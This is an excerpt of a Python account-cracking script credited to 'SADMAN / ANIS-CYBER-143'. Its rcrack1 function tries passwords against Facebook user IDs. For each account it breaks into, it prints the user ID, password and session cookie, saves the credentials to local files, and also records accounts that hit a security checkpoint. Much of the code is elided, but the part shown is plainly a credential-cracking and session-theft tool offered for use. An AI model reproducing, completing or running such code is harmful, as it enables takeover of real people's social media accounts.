...
\033[1;32m[-] AUTHOR    :\033[1;32m SADMAN
\033[1;32m[-] GITHUB    :\033[1;32m ANIS-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m KMATCHO 
\033[1;92m══════════════════════════════════════════
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[ANIS-OK] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/ANIS/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ANIS-CP] {uid}|{ps}")
                open('/sdcard/ANIS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ANIS-KMATCHO💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
